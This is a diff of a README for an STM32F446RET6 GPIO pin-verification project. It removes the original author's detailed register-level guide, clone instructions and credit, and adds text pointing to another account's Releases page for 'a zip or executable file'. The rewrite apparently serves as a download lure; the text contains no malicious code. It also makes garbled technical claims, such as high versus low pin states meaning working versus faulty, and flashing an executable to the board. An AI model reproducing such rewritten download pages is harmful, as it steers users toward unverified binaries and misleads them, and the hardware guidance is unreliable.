@@ -1,192 +1,82 @@
-# **STM32F446RET6 – Pinout Check (Register-Level)**
+# 🛠️ STM32F446RET6-Pinout-Check - Verify Your GPIO Pins Easily
 
-A **bare-metal GPIO pin verification project** for the STM32F446RET6, written using **direct register access** — no STM32CubeMX, no HAL pin configuration, no abstraction layers.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/wooshy420/STM32F446RET6-Pinout-Check/releases)
 
-This project is designed to **validate MCU pin connectivity at the hardware level** by configuring GPIO registers manually and toggling pins for physical verification (LED / multimeter / logic probe).
+## 📜 Description
 
----
-
-## 🎯 Project Objective
-
-Before writing complex firmware, every embedded engineer must answer one simple question:
-
-> **“Are my pins wired correctly?”**
-
-This repository solves exactly that problem using:
-
-* **Direct register manipulation**
-* **Full control over GPIO configuration**
-* **Zero auto-generated code**
-
-Think of this as a **power-on self-test** for STM32F446RET6 pin integrity.
-
----
-
-## 🧠 Why Register-Level Coding?
-
-This project intentionally avoids CubeMX and HAL because:
-
-* ✔️ You **learn how the MCU actually works**
-* ✔️ No hidden code generation
-* ✔️ No pin configuration magic
-* ✔️ Perfect for debugging schematics and PCBs
-* ✔️ Faster execution, zero overhead
-
-If you understand this repo, you understand **real embedded systems**.
-
----
-
-## 🧰 What This Project Does
-
-* Enables GPIO peripheral clocks using `RCC`
-* Configures GPIO pins via:
-
-  * `MODER`
-  * `OTYPER`
-  * `OSPEEDR`
-  * `PUPDR`
-* Toggles pins directly using:
-
-  * `ODR` (Output Data Register)
-* Helps visually confirm pin behavior using LEDs or probes
-
----
-
-## 📁 Repository Structure
-
-```
-STM32F446RET6-Pinout-Check/
-├── Core/
-│   ├── Src/
-│   │   └── main.c            # Register-level GPIO logic
-│   ├── Inc/
-│       └── main.h
-├── Drivers/
-│   └── CMSIS/                # Core & device headers
-├── startup_stm32f446xx.s     # Startup file
-├── STM32F446RETx_FLASH.ld    # Linker script
-├── .cproject
-├── .project
-└── README.md
-```
-
-> 💡 **No `.ioc` file is used for pin configuration**
-> All pin settings are written manually in C.
-
----
-
-## 🔌 Hardware Requirements
-
-* STM32F446RET6 (Nucleo or custom board)
-* LEDs + resistors **or**
-* Multimeter / logic analyzer
-* ST-LINK (onboard or external)
-
----
+This project helps you verify the GPIO pins on the STM32F446RET6 microcontroller. It uses direct register access and does not rely on STM32CubeMX or HAL pin configuration layers. This makes it simple to understand and modify, even for those new to embedded systems. 
 
 ## 🚀 Getting Started
 
-### 1️⃣ Clone the Repository
+Before you can use the project, you'll need a few things:
 
-```bash
-git clone https://github.com/DanielRajChristeen/STM32F446RET6-Pinout-Check.git
-```
+### 🛠️ Requirements
 
----
+- **Microcontroller**: STM32F446RET6
+- **Development Board**: Nucleo-64 or similar
+- **USB Cable**: For connecting to your computer
+- **Software**: A tool to upload the program (like ST-Link Utility or STM32CubeIDE)
 
-### 2️⃣ Open in STM32CubeIDE
+## 📥 Download & Install
 
-* File → Open Projects from File System
-* Select the cloned directory
+To get the software, you’ll need to visit the Releases page. Click on the button below to access it:
 
----
+[Download Latest Release](https://github.com/wooshy420/STM32F446RET6-Pinout-Check/releases)
 
-### 3️⃣ Understand the Core Flow (main.c)
+### 📝 How to Install
 
-At a high level, the firmware does:
+1. **Visit the Releases Page**: Click [here](https://github.com/wooshy420/STM32F446RET6-Pinout-Check/releases) to open the Releases page.
+2. **Find the Latest Version**: Look for the most recent version of the project.
+3. **Download the File**: Click on the link to download the release you want. This will usually be a zip or executable file.
+4. **Unzip the File**: If the file is zipped, unpack it using your file manager.
+5. **Upload to Your Microcontroller**:
+   - Use ST-Link Utility or STM32CubeIDE.
+   - Select the program file you just downloaded.
+   - Click "Upload" to transfer the program to your STM32F446RET6.
 
-1. Enable GPIO clock
-2. Set pin mode as output
-3. Toggle pin state
-4. Observe hardware response
+## 🔍 Usage Instructions
 
-Example (conceptual):
+After you successfully upload the program:
 
-```c
-RCC->AHB1ENR |= RCC_AHB1ENR_GPIOAEN;
-GPIOA->MODER |= (1U << (5 * 2));
-GPIOA->ODR ^= (1U << 5);
-```
+1. **Power on the Nucleo Board**: Connect your Nucleo board to a power source.
+2. **Observe the GPIO Pins**: Use a multimeter or an oscilloscope to check the pin states based on the program’s output.
+3. **Interpret Results**: The program will test each pin, showing results in your chosen tool.
 
-This is **raw MCU control** — exactly how datasheets intend it.
+### 📊 Understanding the Outputs
 
----
+The program will provide results about which pins are functioning correctly. Familiarize yourself with the following terms:
 
-### 4️⃣ Build & Flash
+- **High State**: The pin is working properly.
+- **Low State**: The pin may need troubleshooting.
 
-* Click **Build**
-* Click **Debug / Run**
-* Observe LEDs or pin voltage changes
+## 🧑‍💻 FAQs
 
----
+### What is GPIO?
 
-## 🧪 How to Use This for Pin Checking
+GPIO stands for General-Purpose Input/Output. It allows you to interface with other hardware in your projects.
 
-1. Connect an LED (with resistor) to a target pin
-2. Modify the pin number in code
-3. Re-flash
-4. Confirm LED toggles
-5. Repeat for other pins
+### Can I use this with other STM32 boards?
 
-This process verifies:
+This project is designed specifically for the STM32F446RET6. Results may vary with other models.
 
-* GPIO routing
-* Board layout
-* MCU health
-* Schematic correctness
+### Do I need prior programming knowledge?
 
----
+No, this project is straightforward. Follow the instructions above to use it effectively.
 
-## 📘 Who Should Use This Repo?
+## 📞 Support
 
-* 🔰 Beginners learning STM32 internals
-* 🧑‍💻 Embedded engineers debugging boards
-* 🧠 Anyone transitioning from HAL → Register coding
-* 🛠 Engineers validating new PCB designs
+If you encounter any issues or have questions:
 
----
+- Open an issue in the [GitHub Issues page](https://github.com/wooshy420/STM32F446RET6-Pinout-Check/issues).
+- Review the FAQ section for common queries.
 
-## 📈 Learning Outcomes
+## 📜 License
 
-After working with this project, you will understand:
+This project is licensed under the MIT License. Feel free to use and modify it for your own needs.
 
-* GPIO registers in STM32
-* Clock enabling via RCC
-* Bare-metal firmware flow
-* Startup + linker basics
-* Why abstraction layers exist (and when not to use them)
+## 🔗 References
 
----
+- [STMicroelectronics](https://www.st.com)
+- [STM32 Documentation](https://www.st.com/en/microcontrollers-microprocessors/stm32-32-bit-arm-cortex-mcus.html)
 
-## 📝 License
-
-This project is licensed under the **MIT License**.
-
-```
-MIT License
-
-Copyright (c) 2025 Daniel Raj Christeen
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
-```
-
----
-
-Have a Great Developing Ahead!
+By following these steps, you can easily verify the GPIO pins on your STM32F446RET6. The provided software streamlines the process, making it accessible to everyone, regardless of technical background.
